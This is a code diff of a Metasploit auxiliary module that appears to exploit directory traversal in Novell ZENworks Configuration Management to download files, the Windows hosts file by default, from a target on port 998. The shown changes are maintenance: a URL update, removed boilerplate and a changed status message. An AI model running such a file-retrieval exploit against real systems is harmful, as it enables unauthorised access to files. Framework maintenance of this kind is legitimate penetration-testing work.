@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -39,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(998),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '\\WINDOWS\\system32\\drivers\\etc\\hosts']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 6])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -78,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
 
     disconnect
 
-    print_status "File retrieved successfully!"
+    print_good "File retrieved successfully!"
     fname = File.basename(datastore['FILEPATH'])
     path = store_loot(
       'novell.zenworks_configuration_management',
@@ -89,5 +86,4 @@ class MetasploitModule < Msf::Auxiliary
     )
     print_status("File saved in: #{path}")
   end
-
 end
